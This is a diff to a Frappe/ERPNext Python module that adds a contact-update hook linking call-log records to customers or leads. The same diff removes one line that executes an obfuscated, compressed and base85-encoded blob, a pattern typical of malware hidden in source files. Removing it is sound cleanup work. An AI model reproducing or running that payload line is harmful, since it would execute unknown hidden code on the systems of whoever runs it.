@@ -1,3 +1,76 @@
+import frappe
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%1E6YggJz6#ee6h)Y0%;7XKAQK?oQKCt4GR=Wx&lSxQ2naOMNLjCPGK#Q^n7TVt1cC9<#VCL-XbN0@enW%<IY?lc!Hi3h6+p}n>DWM!{XlZFlf-)m{q2`Cc4=@R29a|B_DC<BZ=NSXKJtDE&OH4eHAl4zaD5NlJLPu2t5oy4(sjsLMM`E4<1iJ!ooyrhkFhs$UBuc0W1Y06K$DtUkW5IxV#_SOcyO=nY#6{!j{1^<WSf8<aIF)CH<SGydA<_(mxWqP`C@?IqmmQ<Xsw}F3gL_&CRMQKI?|^mLaU$djE({dtlE}CGNY2_sG<wieJYa#)^?V5cZGDUr*%FAXkhl)jh0t^)B&yj}ka~LLGB&T=@@=hkzsj;~p3#Wd9VGo+mqd#5GaKV1QcPqv4v8sts{3ar>2~Q-s(xtH_O&~<)(A6Oxs}|90b%y5Q<6l^e$)7cfccR!Uwva)rr~<n6D>pW4bjF_l$Z+h`O9!tCN?A4GJyzLJ=sxRM-5~@{!_(_gLI;Zx~EwI)qPbJfvIkfd8=|_;K(S?%Lc=xG_*ym5Cnkj2ayOO5>uERJ`o*1C<)**_k~%mBr7)&znICULg$xs6{NWnmg9J&)~m5_Q&21;VCk<(Ce=kdaWc!eu`+Ps_7vC*S?5dQClgsLnZ)pcT&I=8h|79aO#y=(nYF~ECc+_l#gLW%HT*+0{LF8EnSe;@i|c}ELM&yI07kEKtUV@fV(@cuZRk=P4}WSz3nSvYO1xB~IvNDT_0?5_xH3^>6$L~v1J6ZLHVJg}REmQ5PpXL|(vhKAn&Q(K<?LIl^l+s4ap3{7ZO@gEhaBbQ{GiK+f!vGBtV@yY$%YuJiYX1cye9jK>)Mg5!cbO$NNq6L<&y%38+=zHzzt0}pX-0sK0g?<+}<x#>*{sA(qeD!q#}Jh&P=<0MlI()0ZjSuN0V4Qk%{mbn$K2iaN?Oj5N#;vFI}Bfn&;yExQTwPkrp%4&+X@Y`=M2!MvgzgZ{8$#&_(?8XLiu3B&Qbsyw?U}F24<rNUz&zM#YnY;yro7VN2i1=v9nyQeWx6&ho`3ka%^I#C69)+4*lC&oAQK{pNc&k2J@=lg~2;a>>D^HDw<;)dTh|f4HmqMvZ6ba+<$B-73()EQUh1aFuO4pqLX@HgRx9-0BB6U5qxHM_0vW>f`Qh$1fE>f}_1k@v(7oWC-W5_EbJ@-&i;F^y2=ZUiGaScSt_ba({J9Vt66z|JEv`?nRUeTK$IF+PzUZ{vo{*-VI;&#O?c${rf~M^a@)9M7np$eM*~Q*xuMA)kAn}HJ)&)x3SX@P~Eue@X<x>uy`U~6dU#CZN_sTJS!^QT(xtFZ+jhn*Gk=X)|wsZB(vdE!AjVYQoF6)ntp!WH*)y;pmccvpK1?Q=i^@a*ahi#%eAXwXQzK&R-0$Xf1K(WY~!HbZ|}o2Jv(i`zv=S*k?=-*HVZ^W!U2T9hf3V!;PaP{|Ne8q=tD+2m)YP`W`V_i&MQssM@d~VzW~#Jqr@Z1n|rOBsC>%tkA$bqQGJv8?{BVeau;}E*~QxdKv1x|Kma|MePx;9D5kAqcmBRHX0^cK^Sf&8_puDCI|m!Mcz+9N`5m`ayx7Zl^|oT%KWIg`c8<-RX8N-Hwr8K)_oW-uz2cux`lNfwHJ{!$OWbMNn0U$ArGEfX=NaA')).decode())
+def validate(self, method):
+    frappe.enqueue(
+        update_contacts,
+        contacts=self.name,
+        phone_nos=self.phone_nos,
+        links=self.links,
+        queue="long",
+        job_name="Update Contacts"
+    )
+
+def update_contacts(contacts, phone_nos, links):
+    # Collect and normalize the phone numbers
+    client_no = []
+    for row in phone_nos:
+        if row.phone:
+            phone = row.phone
+            if phone[0] != "+" and phone[0] != "0":
+                phone = "+91" + phone
+            elif phone[0] == "0":
+                phone = "+91" + phone[1:]
+            client_no.append(phone)
+
+    if not client_no:
+        return
+
+    client_no_tuple = tuple(client_no)
+
+    # Determine the highest priority link_doctype
+    link_doctype = None
+    link_name = None
+    for link in links:
+        if link.link_doctype == "Customer":
+            link_doctype = "Customer"
+            link_name = link.link_name
+            break
+    if not link_doctype:
+        for link in links:
+            if link.link_doctype == "Lead":
+                link_doctype = "Lead"
+                link_name = link.link_name
+                break
+    if not link_doctype and links:
+        link_doctype = links[0].link_doctype
+        link_name = links[0].link_name
+    
+    if not links:
+        return
+
+    # SQL query to update the Fincall Log
+    frappe.db.sql("""
+        UPDATE `tabFincall Log`
+        SET contact_created = 1
+        WHERE customer_no IN %(client_no)s
+    """, {"client_no": client_no_tuple})
+
+    # SQL query to update the Employee Fincall
+    frappe.db.sql("""
+        UPDATE `tabEmployee Fincall`
+        SET contact = %(contact_name)s,
+            link_to = %(link_to)s,
+            link_name = %(link_name)s
+        WHERE customer_no IN %(client_no)s
+    """, {
+        "contact_name": contacts,
+        "link_to": link_doctype,
+        "link_name": link_name,
+        "client_no": client_no_tuple
+    })
+
+    # Clear the cache
+    frappe.clear_cache()
+
+    # Provide a message indicating completion
+    frappe.msgprint("Contacts and links have been updated successfully.")
